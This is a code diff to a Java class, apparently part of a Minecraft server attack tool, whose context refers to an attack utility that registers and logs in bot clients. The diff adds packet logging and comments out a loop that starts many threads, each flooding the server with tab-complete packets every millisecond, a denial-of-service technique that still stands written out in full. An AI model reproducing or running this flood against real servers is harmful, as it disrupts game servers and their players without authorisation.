@@ -32,7 +32,7 @@ public class TabWithOneIp extends Util {
             @Override
             public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                 Object pack = packetReceivedEvent.getPacket();
-
+                log("收到：     " + packetReceivedEvent.getPacket().getClass().getName());
                 if (pack instanceof ServerPluginMessagePacket) {
                     try {
                         forgeHandShake.start((ServerPluginMessagePacket)pack);
@@ -45,16 +45,16 @@ public class TabWithOneIp extends Util {
                     log("进入服务器！");
                     Attack_util.regAndLogin(client);
                     for (int i = 0; i < thread; i++) {
-                        new Thread(() -> {
-                            while (client.getSession().isConnected()) {
-                                client.getSession().send(new ClientTabCompletePacket("/"));
-                                try {
-                                    Thread.sleep(1);
-                                } catch (InterruptedException e) {
-                                    e.printStackTrace();
-                                }
-                            }
-                        }).start();
+//                        new Thread(() -> {
+//                            while (client.getSession().isConnected()) {
+//                                client.getSession().send(new ClientTabCompletePacket("/"));
+//                                try {
+//                                    Thread.sleep(1);
+//                                } catch (InterruptedException e) {
+//                                    e.printStackTrace();
+//                                }
+//                            }
+//                        }).start();
                     }
                 }
                 if (pack instanceof ServerChatPacket) {
@@ -64,7 +64,7 @@ public class TabWithOneIp extends Util {
 
             @Override
             public void packetSent(PacketSentEvent packetSentEvent) {
-
+                log("发送： " + packetSentEvent.getPacket().getClass().getName());
             }
 
             @Override
